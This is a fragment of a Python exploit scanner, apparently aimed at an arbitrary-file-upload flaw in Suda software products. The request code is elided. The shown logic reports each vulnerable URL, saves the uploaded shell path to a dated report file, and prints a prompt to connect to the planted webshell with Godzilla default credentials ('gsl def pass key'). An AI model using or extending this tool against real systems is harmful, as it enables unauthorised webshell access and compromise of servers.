...
filename = "./reps/速达软件全系产品存在任意文件上传-"+str(time.strftime("%Y-%m-%d", time.localtime()))
...
def sudafileupload(url):
    try:
        ...
        if repps.status_code == 200:
            print(buter.colors.GREEN+  f"存在速达软件全系产品存在任意文件上传 url : {url} \n请使用gsl def pass key 连接 {shell_path}" + buter.colors.END)
            reptext = shell_path
            wirtefile.writefiles(filename,reptext)
        else:
            print(buter.colors.RED+ f"未发现速达软件全系产品存在任意文件上传 url : {url} " + buter.colors.END)
